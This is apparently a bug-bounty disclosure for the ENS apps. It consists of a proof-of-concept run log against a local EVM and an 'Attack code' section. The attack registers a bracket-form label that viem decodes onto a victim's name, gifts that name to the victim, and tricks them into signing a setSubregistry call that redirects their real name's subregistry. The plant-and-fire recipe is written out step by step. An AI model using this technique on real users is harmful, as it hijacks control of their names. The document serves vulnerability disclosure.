  repo:  G:\My Drive\hunter\hunt_data\ens\ens-apps
  build: C:\Users\dmill\AppData\Local\Temp\ens-poc-bracket-setsubregistry-detach
==============================================================================

==============================================================================
  ACT 1  viem's labelhash() decodes the bracket label onto V, not the attacker's own name
==============================================================================
    labelhash("r42victimb2")           0x2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2dab58cf5e
    BRACKET_LABEL                      [2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2dab58cf5e]
    labelhash(BRACKET_LABEL)           0x2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2dab58cf5e

  >> Identical. viem/utils/ens/labelhash.js tries encodedLabelToLabelhash()
     first, which reads the 64 hex characters between [ and ] straight
     out, before it ever tries keccak256.

    keccak256(bytes(BRACKET_LABEL))    0xcbc8bb7ba10ff2fada87915a2015d384b9a4bfe6e45329b7dc6dafc65521203b
  >> Different. This is the identity the CHAIN assigns the bracket name
     itself when the attacker registers it (LibLabel.id hashes the
     literal string). The two identities of the same on-screen row
     diverge here.

==============================================================================
  ACT 2  Local EVM: victim registers V, seeds V's real pre-attack subregistry
==============================================================================
    PermissionedRegistryModel          0x5fbdb2315678afecb367f032d93f642f64180aa3
    V subregistry, seeded              0x693C1f80C7FFD9aB7f4563678516dF283D357D26

==============================================================================
  ACT 3  The attacker registers the bracket label at ITS TRUE chain id, gets roles only there
==============================================================================
    hasRoles(bracket true id, ROLE_SET_SUBREGISTRY, attacker) true
    hasRoles(V, ROLE_SET_SUBREGISTRY, attacker) false

==============================================================================
  ACT 4  CONTROL: the attacker's own direct setSubregistry on V reverts
==============================================================================
  ATTACKER.setSubregistry(V, attackerSubregistry) -> REVERTED: Unauthorized(0x2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2d00000000, 0x70997970C51812dc3A010C7d01b50e0d17dc79C8, 0x100000)

  >> An attacker who registers the bracket name has no direct path to
     V. Whatever happens next is created by the decode, not by
     authority the attacker already had.

==============================================================================
  ACT 5  The role gate the app queries before showing the button decodes the same way
==============================================================================
    hasRoles(labelhash(BRACKET_LABEL), ROLE_SET_SUBREGISTRY, victim) true

  >> ConfigureRegistryForm.tsx:92-100 runs exactly this check with the
     bracket label. It decodes onto V, which the victim owns, so the
     "Configure registry" button renders instead of staying disabled.

==============================================================================
  ACT 6  THE ATTACK: the real ENSJS calldata for the bracket label targets V instead
==============================================================================
    setSubregistryWriteParameters(label=BRACKET_LABEL).functionName setSubregistry
    decoded.args[0] (resource, as signed) 0x2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2dab58cf5e
    canonical(decoded.args[0])         0x2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2d00000000
    V_CHAIN_TOKEN_ID (independently read from chain) 0x2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2d00000000

  >> The real ensjs function, given only the bracket label and the new
     subregistry address, builds calldata whose argument canonicalises
     to V's own chain token id -- recorded independently from the chain
     during this bug's mined-transaction corroboration, not derived
     from the bracket label anywhere in this script (evidence/FORENSICS.txt:9,26).

==============================================================================
  ACT 7  The victim's wallet signs it: V's subregistry moves, the bracket row's stays 0x0
==============================================================================
    V subregistry, after               0xb388b0FBD944925Ed69d4b0D5F43a7cCFD044E74
    bracket row subregistry, before -> after 0x0000000000000000000000000000000000000000 -> 0x0000000000000000000000000000000000000000

------------------------------------------------------------------------------
  LEDGER (subregistry pointer, read from the EVM state trie)
------------------------------------------------------------------------------
    resource                    before                          after
    V  (r42victimb2.eth, real)     0x693C1f80...357D26     0xb388b0FB...044E74
    BRACKET  (attacker's own)     0x00000000...000000   0x00000000...000000
------------------------------------------------------------------------------

  >> The transaction the victim signed to configure the registry on the
     row displayed on screen moved V's subregistry pointer instead. The
     bracket name never had a subregistry set, and still does not.

  PoC PASSED, every assertion held.
```

The calldata this run builds from the real ENSJS write-parameter builder, given only the bracket label, decodes to a resource that canonicalizes to `V`'s chain token id as independently recorded from the mined transaction. `V`'s subregistry moved from its recorded before value to the recorded after value; the bracket row's own subregistry, indexed by its own true chain id, stayed zero throughout.

## Attack code

```ts
// 1. Attacker registers an ordinary name whose label is the bracket form of
//    labelhash(V): "[2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2dab58cf5e]"
//    On chain this label hashes to a value that has nothing to do with V.
```

```ts
// 2. Attacker gifts the registered name to the victim with a standard
//    token transfer. No consent or transaction from the victim is required.
```

```ts
// 3. Victim opens the gift's Registry tab, sees no subregistry configured,
//    and clicks "Configure registry" to set one, as they would for any
//    name they control.
setSubregistry(deployedOrCustomSubregistryAddress)
```

```js
// 4. ConfigureRegistryForm.tsx:89 -> setSubregistry.ts:59-63 -> ensjs
//    setSubregistry.js:9 computes the argument:
BigInt(labelhash('[2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2dab58cf5e]'))
// == BigInt(labelhash('r42victimb2'))
```

```
// 5. The victim's wallet signs setSubregistry(labelhash(V), newSubregistry).
//    V's subregistry moves. The bracket name's own subregistry stays 0x0.
```

```
plant : register a name whose label is "[" + hex(labelhash(target)) + "]" and gift it to the victim
fire  : the victim clicks Configure registry on that gift
```
